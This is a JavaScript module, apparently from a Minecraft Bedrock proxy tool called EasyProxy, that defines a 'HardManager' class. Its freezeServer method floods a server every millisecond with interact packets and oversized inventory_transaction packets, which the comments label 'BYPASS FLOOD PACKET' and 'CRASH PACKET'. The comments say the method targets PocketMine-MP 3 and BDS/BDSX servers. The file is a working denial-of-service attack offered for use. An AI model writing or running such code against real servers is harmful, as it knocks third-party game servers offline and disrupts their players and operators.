/**
 *
 *  ███████╗ █████╗ ███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗
 *  ██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝
 *  █████╗  ███████║███████╗ ╚████╔╝ ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝
 *  ██╔══╝  ██╔══██║╚════██║  ╚██╔╝  ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝
 *  ███████╗██║  ██║███████║   ██║   ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║
 *  ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝
 *
 *  Release by EasyProxy's Project!
 *  Github: https://https://github.com/Zwuiix-cmd/EasyProxy
 *
 */

class HardManager
{
    player;
    actions = [];

    constructor(Player)
    {
        this.player=Player;
    }

    /**
     *
     * @param count {number}
     */
    generateActions(count)
    {
        for (let i = 0; i < count; i++) this.actions.push({source_type: "container", inventory_id: 0, slot: 28, old_item: {network_id: 0}, new_item: {network_id: 0}});
    }

    freezeServer()
    {
        // TODO: FREEZE ONLY PM3 SERVERS (PM4 PATCHED)
        // TODO: On BDS or BDSX it also works very well!
        setInterval(async () => {

            // TODO: BYPASS FLOOD PACKET
            this.player.getBedrockPlayer().upstream.queue('interact', {
                action_id:"mouse_over_entity",
                target_entity_id:0,
                position: {x:0,y:0,z:0}
            });

            // TODO: CRASH PACKET
            this.player.getBedrockPlayer().upstream.queue('inventory_transaction', {
                transaction: {
                    legacy: {legacy_request_id: 0},
                    transaction_type: "normal",
                    actions: this.actions
                }
            });
        }, 1);
    }
}
module.exports = HardManager;